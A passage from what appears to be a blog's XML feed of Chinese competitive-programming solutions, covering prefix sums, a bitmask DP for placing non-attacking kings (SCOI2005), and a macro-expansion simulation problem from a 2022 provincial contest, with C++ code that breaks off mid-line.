+ l);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= t.idx; i++) ans = std::<span class="built_in">min</span>(ans, f[m][i]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Case %d: %d\n&quot;</span>, ++counts, ans == INT_MAX ? <span class="number">-1</span> : ans);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>字符串</tag>
        <tag>AC 自动机</tag>
        <tag>POJ</tag>
      </tags>
  </entry>
  <entry>
    <title>前缀和学习笔记</title>
    <url>/prefix-sum-notes/</url>
    <content><![CDATA[<h1 id="概念">概念</h1>
<p>前缀和为一种预处理，可理解为数列前 <span
class="math inline">\(n\)</span>
项的和。可降低查询某些信息的所需时间。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前缀和示例</span></span><br><span class="line"><span class="type">int</span> sum[MAXN];</span><br><span class="line">sum[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">    sum[i] = sum[i - <span class="number">1</span>] + a[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h2 id="stl-中的前缀和">STL 中的前缀和</h2>
<p>C++ 标准库中提供了 <code>std::partial_sum</code>
前缀和函数，定义于头文件 <code>&lt;numeric&gt;</code> 中</p>
<p>用法为
<code>partial_sum(InputIt first, InputIt last, OutputIt d_first)</code></p>
<ul>
<li><p><code>first</code> 和 <code>last</code>
表示要求和的元素范围；</p></li>
<li><p><code>d_first</code> 表示目标范围起始；可以等于
<code>first</code>。</p></li>
</ul>
<h1 id="例题">例题</h1>
<p><a href="https://www.luogu.com.cn/problem/P3131">洛谷 P3131
[USACO16JAN]Subsequences Summing to Sevens S</a></p>
<p>本题直接处理前缀和存储余数，在前缀和中取头尾两余数相等的数坐标相减即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">50000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, maxn = <span class="number">0</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a[MAXN + <span class="number">1</span>];</span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        std::cin &gt;&gt; a[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> sum[MAXN + <span class="number">1</span>];</span><br><span class="line">    sum[<span class="number">1</span>] = a[<span class="number">1</span>] % <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        sum[i] = (sum[i - <span class="number">1</span>] + a[i]) % <span class="number">7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> first[<span class="number">7</span>], last[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">memset</span>(first, <span class="number">0</span>, <span class="built_in">sizeof</span>(first));</span><br><span class="line">    <span class="built_in">memset</span>(last, <span class="number">0</span>, <span class="built_in">sizeof</span>(last));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">            <span class="keyword">if</span> (sum[j] == i) &#123;</span><br><span class="line">                first[i] = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = n; j &gt;= <span class="number">1</span>; j--)</span><br><span class="line">            <span class="keyword">if</span> (sum[j] == i) &#123;</span><br><span class="line">                last[i] = j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    maxn = last[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (last[i] - first[i] &gt; maxn) &#123;</span><br><span class="line">            maxn = last[i] - first[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; maxn &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="二维多维前缀和">二维/多维前缀和</h1>
<p>RT</p>
<h2 id="例题-1">例题</h2>
<p><a href="https://www.luogu.com.cn/problem/P1387">洛谷 P1387
最大正方形</a></p>
<p>本题可通过前缀和处理矩形，利用 <code>sum</code>
数组存储可组成正方形的最大值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> squ[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">            std::cin &gt;&gt; squ[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> sum[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(sum, <span class="number">0</span>, <span class="built_in">sizeof</span>(sum));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= m; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (squ[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                sum[i][j] = std::<span class="built_in">min</span>(std::<span class="built_in">min</span>(sum[i - <span class="number">1</span>][j] , sum[i][j - <span class="number">1</span>]), sum[i - <span class="number">1</span>][j - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (sum[i][j] &gt; ans) &#123;</span><br><span class="line">                    ans = sum[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; ans &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>前缀和</tag>
      </tags>
  </entry>
  <entry>
    <title>「SCOI2005」互不侵犯 - 状压 DP</title>
    <url>/scoi2005-king/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P1896">洛谷链接</a></p>
<p><a href="https://loj.ac/p/2153">LibreOJ 链接</a></p>
<p>在 <span class="math inline">\(N \times N\)</span> 的棋盘里面放 <span
class="math inline">\(K\)</span>
个国王，使他们互不攻击，共有多少种摆放方案。国王能攻击到它上下左右，以及左上左下右上右下八个方向上附近的各一个格子，共
<span class="math inline">\(8\)</span> 个格子。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>很明显这是一道状压 DP 的题目。我们可以定义数组 <span
class="math inline">\(f_{i, j, l}\)</span>，状态表示中 <span
class="math inline">\(i\)</span> 表示行数，<span
class="math inline">\(j\)</span> 表示已经放下的国王数，<span
class="math inline">\(l\)</span> 表示当前这行的国王放置状态。其中 <span
class="math inline">\(l\)</span> 使用二进制表示子集存储，<span
class="math inline">\(1\)</span> 表示放置国王。整个 <span
class="math inline">\(f\)</span> 表示当前状态的可能数。</p>
<p>显然我们可以推出下列状态转移方程（<span
class="math inline">\(\text{cnt}_x\)</span> 表示 <span
class="math inline">\(x\)</span> 状态下当前行的国王数，<span
class="math inline">\(\text{reach}\)</span> 代表添加一行可达到 <span
class="math inline">\(l\)</span> 的情况的集合）：</p>
<p><span class="math display">\[
f_{i, j + \text{cnt}_m, l} = \sum_{\text{reach}} f_{i - 1, j, m} \quad j
\in [\text{cnt}_l, k - \text{cnt}_j]
\]</span></p>
<p>对于 <span class="math inline">\(f\)</span>
的初始化，我们仅需要做的是将 <span class="math inline">\(i = 1\)</span>
的所有合法的序列赋值为 <span class="math inline">\(1\)</span> 即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, k;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> f[MAXN + <span class="number">1</span>][MAXN * MAXN + <span class="number">1</span>][<span class="number">1</span> &lt;&lt; MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">counts</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; (<span class="number">1</span> &lt;&lt; i) &lt;= x; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((x &gt;&gt; i) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">        <span class="type">bool</span> con = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> each = <span class="number">1</span>; each &lt; n - <span class="number">1</span>; each++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (((i &gt;&gt; each) &amp; <span class="number">1</span>) &amp;&amp; (((i &gt;&gt; (each - <span class="number">1</span>)) &amp; <span class="number">1</span>) || ((i &gt;&gt; (each + <span class="number">1</span>)) &amp; <span class="number">1</span>))) &#123;</span><br><span class="line">                con = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> cnt = <span class="built_in">counts</span>(i);</span><br><span class="line">        <span class="keyword">if</span> (con &amp;&amp; cnt &lt;= k) f[<span class="number">1</span>][cnt][i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">dp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">1</span> &lt;&lt; n); j++) &#123;</span><br><span class="line">            <span class="type">bool</span> con = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> each = <span class="number">1</span>; each &lt; n - <span class="number">1</span>; each++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (((j &gt;&gt; each) &amp; <span class="number">1</span>) &amp; (((j &gt;&gt; (each - <span class="number">1</span>)) &amp; <span class="number">1</span>) || ((j &gt;&gt; (each + <span class="number">1</span>)) &amp; <span class="number">1</span>))) &#123;</span><br><span class="line">                    con = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> cntJ = <span class="built_in">counts</span>(j);</span><br><span class="line">            <span class="keyword">if</span> (con &amp;&amp; cntJ &lt;= k) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">0</span>; l &lt; (<span class="number">1</span> &lt;&lt; n); l++) &#123;</span><br><span class="line">                    con = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">if</span> ((j &amp; <span class="number">1</span>) &amp;&amp; ((l &amp; <span class="number">1</span>) || ((l &gt;&gt; <span class="number">1</span>) &amp; <span class="number">1</span>))) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span> (((j &gt;&gt; (n - <span class="number">1</span>)) &amp; <span class="number">1</span>) &amp;&amp; (((l &gt;&gt; (n - <span class="number">1</span>)) &amp; <span class="number">1</span>) || ((l &gt;&gt; (n - <span class="number">2</span>)) &amp; <span class="number">1</span>))) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> each = <span class="number">1</span>; each &lt; n - <span class="number">1</span>; each++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (((j &gt;&gt; each) &amp; <span class="number">1</span>) &amp;&amp; (((l &gt;&gt; each) &amp; <span class="number">1</span>) || ((l &gt;&gt; (each - <span class="number">1</span>)) &amp; <span class="number">1</span>) || ((l &gt;&gt; (each + <span class="number">1</span>)) &amp; <span class="number">1</span>))) &#123;</span><br><span class="line">                            con = <span class="literal">false</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">int</span> cntL = <span class="built_in">counts</span>(l);</span><br><span class="line">                    <span class="keyword">if</span> (con &amp;&amp; cntJ + cntL &lt;= k) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> m = cntL; m &lt;= k - cntJ; m++) &#123;</span><br><span class="line">                            f[i][m + cntJ][j] += f[i - <span class="number">1</span>][m][l];</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">getAns</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; n); i++) &#123;</span><br><span class="line">        ans += f[n][k][i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; k;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dp</span>();</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">getAns</span>() &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>省选</tag>
        <tag>状压 DP</tag>
        <tag>SCOI</tag>
        <tag>2005</tag>
      </tags>
  </entry>
  <entry>
    <title>「联合省选 2022」预处理器 - 模拟</title>
    <url>/pro2022-preprocessor/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P8289">洛谷链接</a></p>
<p><a href="https://loj.ac/p/3700">LibreOJ 链接</a></p>
<p>对于该题，你需要展开 <code>#define</code> 宏定义。本题中的宏定义与
C++ 中的宏定义大致相同，不过有下列特点：</p>
<ul>
<li>可以用 <code>#undef</code> 取消宏定义；</li>
<li>可以进行多次展开。如
<code>#define a b+e</code>，<code>#define b c+d</code>，对于
<code>a</code> 最终展开结果为 <code>c+d+e</code>；</li>
<li>可以进行递归展开，但若待展开的宏名与正在进行展开的某个宏名相同，为了防止无限递归，此时宏名就不再展开。如
<code>#define a b+c</code>，<code>#define b a+a</code>，对于
<code>b</code> 的展开结果即为 <code>b+c+b+c</code>。</li>
</ul>
<p>其他细节详见题面。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p><del>一道让 OI 倒退 15 年的题</del></p>
<p>本题是一道细节超多的模拟题。</p>
<p>首先我们需要解决这道题的输入。以分隔符为界，分段读入即可。每个分隔符（包括空格）可以看成单独一个字符串读入即可。</p>
<p>然后我们可以用 <code>std::map&lt;std::string, std::string&gt;</code>
存储 <code>#define</code> 的对应关系。对于
<code>#undef</code>，我们仅需在 <code>map</code> 中删除该项即可。</p>
<p>最后我们需要解决的是字符串展开问题，也是本题中细节最多的部分。</p>
<p>由于本题中涉及了递归展开，我们可以考虑使用递归来编写处理函数
<code>solve</code>。首先考虑在 <code>map</code>
中是否有已经定义的字符串或者是否被打标记，若 <code>map</code>
中没有或被打了标记则直接输出。若有，则进行以下操作：</p>
<ol type="1">
<li>进行标记（在本代码中使用 <code>vis</code> 进行）；</li>
<li>展开当前的字符串；</li>
<li>将字符串分段读入（读入方式见上）；</li>
<li>对于每段字符串分别递归求解；</li>
<li>取消标记。</li>
</ol>
<p>注意 4
步很重要，若直接展开后递归，则无法处理两将要展开的字符串并列的情况。接下来为该情况
Hack 数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">#define a b+c</span><br><span class="line">#define b a+a</span><br><span class="line">b</span><br></pre></td></tr></table></figure>
<p>结果应为 <code>b+c+b+c</code>，但是直接展开后递归的结果会是
<code>b+c+a</code>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tuple&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line">std::map&lt;std::string, std::string&gt; def;</span><br><span class="line">std::map&lt;std::string, <span class="type">bool</span>&gt; vis;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title">isID</span><span class="params">(<span class="type">char</span> ch)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span>) || (ch &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span>) || (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>) || ch == <span class="string">&#x27;_&#x27;</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tuple 中第一项代表读到的字符串，第二项表示是否为分隔符，第三项表示结束位置对应 src 的下标</span></span><br><span class="line"><span class="comment">// 建议可以学一下 tuple 的用法</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> std::tuple&lt;std::string, <span class="type">bool</span>, <span class="type">int</span>&gt; <span class="title">reads</span><span class="params">(std::string src, <span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isID</span>(src[pos])) &#123;</span><br><span class="line">        std::string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">int</span> len = src.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">while</span> (pos &lt; len &amp;&amp; <span class="built_in">isID</span>(src[pos])) &#123;</span><br><span class="line">            str += src.<span class="built_in">substr</span>(pos, <span class="number">1</span>);</span><br><span class="line">            pos++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> std::<span class="built_in">make_tuple</span>(str, <span class="literal">true</span>, pos);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        str += src.<span class="built_in">substr</span>(pos, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> std::<span class="built_in">make_tuple</span>(str, <span class="literal">false</span>, pos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个函数专门读 #define</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> std::pair&lt;std::string, <span class="type">int</span>&gt; <span class="title">readDef</span><span class="params">(std::string src, <span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> len = src.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">while</span> (pos &lt; len &amp;&amp; <span class="built_in">isspace</span>(src[pos])) pos++;</span><br><span class="line">    std::string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (pos &lt; len &amp;&amp; !<span class="built_in">isspace</span>(src[pos])) str += src[pos++];</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">make_pair</span>(str, pos);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">(std::string str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (def.<span class="built_in">count</span>(str) != <span class="number">0</span> &amp;&amp; !vis[str]) &#123;</span><br><span class="line">        vis[str] = <span class="literal">true</span>;</span><br><span class="line">        std::string src = str;  <span class="comment">// 注意要存原先字符串以在取消标记时使用</span></span><br><span class="line">        str = def[str];</span><br><span class="line">        std::tuple&lt;std::string, <span class="type">bool</span>, <span class="type">int</span>&gt; getReads = std::<span class="built_in">make_tuple</span>(<span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> len = str.<span class="built_in">length</span>();</span><br><span class="line">        std::vector&lt;std::string&gt; vec;</span><br><span class="line">        <span class="keyword">while</span> (std::<span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(getReads) &lt; len) &#123;</span><br><span class="line">            getReads = <span class="built_in">reads</span>(str, std::<span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(getReads));</span><br><span class="line">            vec.<span class="built_in">push_back</span>(std::<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(getReads));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (std::string each : vec) <span class="built_in">solve</span>(each);</span><br><span class="line">        vis[src] = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> std::cout &lt;&lt; str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    std::cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XEDEBUG</span></span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;preprocessor.in&quot;</span>, <span class="string">&quot;r&quot;</span>, stdin);</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;preprocessor.out&quot;</span>, <span class="string">&quot;w&quot;</span>, stdout);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n;</span><br><span class="line">    std::cin.<span class="built_in">ignore</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        std::string str;</span><br><span class="line">        std::<span class="built_in">getline</span>(std::cin, str);</span><br><span class="line">        std::tuple&lt;std::string, <span class="type">bool</span>, <span class="type">int</span>&gt; getReads = std::<span class="built_in">make_tuple</span>(<span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> len = str.<span class="built_in">length</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (std::<span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(getReads) &lt; len) &#123;</span><br><span class="line">            getReads = <span class="built_in">reads</span>(str, std::<span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(getReads));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (std::<span class="built_in">get</span>&lt;<span class="number">1</span>&gt;(getReads)) &#123;</span><br><span class="line">                vis.<span class="built_in">clear</span>();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span> each : def) vis[each.first] = <span class="literal">false</span>;</span><br><span class="line">                <span class="built_in">solve</span>(std::<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(getReads));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (std::<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(getReads) == <span class="string">&quot;#&quot;</span>) &#123;</span><br><span class="line">                getReads = <span class="built_in">reads</span>(str, std::<span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(getReads));</span><br><span class="line">                <span class="keyword">if</span> (std::<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(getReads) == <span class="string">&quot;define&quot;</span>) &#123;</span><br><span class="line">                    std::pair&lt;std::string, <span class="type">int</span>&gt; from = <span class="built_in">readDef</span>(str, std::<span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(getReads));</span><br><span class="line">                    std::string to = str.<span class="built_in">substr</span>(from.second + <span class="number">1</span>);</span><br><span class="line">                    def[from.first] = to;</span><br><span class="line">                    getReads = std::<span class="built_in">make_tuple</span>(to, <span class="literal">true</span>, len);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (std::<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(getReads) == <span class="string">&quot;undef&quot;</span>) &#123;</span><br><span class="line">                    std::string from = str.<span class="built_in">substr</span>(std::<span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(getReads) + <span class="number">1</span>);</span><br><span class="line">                    def.<span class="built_in">erase</span>(from);</span><br><span class="line">                    getReads = std::<span class="built_in">make_tuple</span>(from, <span class="literal">true</span>, len);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    std::cout &lt;&lt; 